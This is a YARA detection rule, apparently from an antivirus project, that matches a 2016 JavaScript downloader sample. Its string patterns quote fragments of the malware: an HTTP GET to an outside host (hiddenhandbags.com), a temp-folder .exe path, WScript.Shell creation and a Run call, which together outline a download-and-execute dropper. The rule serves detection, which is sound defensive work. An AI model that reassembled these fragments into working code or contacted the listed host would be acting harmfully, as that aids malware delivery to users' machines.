rule sig_20160329_01e4d8794ab0206d7200d431459b0456 {
  meta:
    description = "datamaliciousorder - file 20160329_01e4d8794ab0206d7200d431459b0456.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7574809c5d09e03003d9ed10ebb602a6ad41fee07ce0a22c8126240f75fad3eb"

  strings:
    $s1  = "zx[t](\"GET\", \"http://hiddenhandbags.com/kdk4a\", false);" fullword ascii
    $s2  = "function gG() {return j[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"loV6FQkmx1.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[PK0](B() * 11); if (zx[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function kx(D, r){N = N * 1; return D - r;};" fullword ascii
    $s5  = "var j = function dg() {return WScript[Qo](\"WScript.Shell\");}(), c = 11;" fullword ascii
    $s6  = "function O(){return \"\" + ZX;};" fullword ascii
    $s7  = "function GL(yP){j[\"Run\"](yP, N, N);};" fullword ascii
    $s8  = "function Q() {return ((k == true) && (k == m)) ? 1 : N;};" fullword ascii
    $s9  = " while (Uk){" fullword ascii
    $s10 = "function R(){return Qo;};" fullword ascii
    $s11 = "function BL(R0) {var g = (1, 2, 3, 4, 5, R0); return g;};" fullword ascii
    $s12 = "var Jb = new this[\"Date\"]();" fullword ascii
    $s13 = "function PK()" fullword ascii
    $s14 = "return kx(z0, K);" fullword ascii
    $s15 = "function B(){return 22;};" fullword ascii
    $s16 = "var DS = false;" fullword ascii
    $s17 = "var m = false;" fullword ascii
    $s18 = "var k = false;" fullword ascii
    $s19 = "k = true; " fullword ascii
    $s20 = "m = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}